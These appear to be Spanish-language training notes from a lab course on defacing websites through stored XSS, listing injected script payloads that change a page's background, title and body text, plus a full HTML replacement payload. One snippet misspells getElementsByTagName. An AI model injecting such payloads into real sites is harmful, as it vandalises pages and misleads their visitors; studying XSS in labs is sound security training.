
Los ataques de desfiguracion de sitios web cambian la apariencia de cualquiera que los visite


## Elementos del defacement

Podemos usar codigo JS inyectado a traves de XSS para hacer que una pagina web tenga el aspecto que queramos

Normalmente se usan 4 elementos HTML para cambiar el aspecto principal:

- Color de fondo: document.body.style.background
- Fondo: document.body.background
- Titulo de pagina: document.title
- Texto de pagina: DOM.innerHTML


## Cambiar el fondo

En el ejemplo que tuvimos de XSS Stored/Persistente podemos usar los elementos HTML de antes para cambiar su apariencia:

Cambiar color de fondo:
```
<script> document.body.style.background="#141d2b" </script>
```

\#141d2b: color de fondo de HTB
black: tambien se pueden usar nombres de colores

Una vez añadido habra cambiado y sera persistente a reinicios:
![[Pasted image 20260716130054.png]]

Establecer una imagen de fondo:
```
<script>document.body.background="https://URL_IMAGEN"</script>
```

Cambiar titulo de la pagina:
```
<script>document.title='ALGO'</script>
```
![[Pasted image 20260716130232.png]]

Cambiar texto:
```
<script>document.getElementById("IDTEXTO").innerHTML="nuevotexto"</script>
```

Cambiar el texto del body, en este caso cambiaremos el primer elemento del body \[0]:

```
<script>document.getElementByTagName("body")[0].innerHTML="nuevotexto"</script>
```

## Usando JQueries

Podemos usar JQueries para que sea mas eficiente o cambiar varios elementos/ JQuery debe estar importado en el codigo fuente de la pagina para poder usarlo:

```
$("#ID_ELEMENTO").html('Nuevo texto');
```


## Metiendo un codigo HTML

1. Preparamos el HTML que vamos a inyectar

```
<center> 
	<h1 style="color: white">Cyber Security Training</h1> 
	<p style="color: white">by
		 <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> 
	 </p> 
</center>
```

2. Lo probamos localmente para ver como se ve
3. Preparamos el payload que vamos a meter

```
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```

4. Lo ejecutamos y vemos que es resistente a cambios
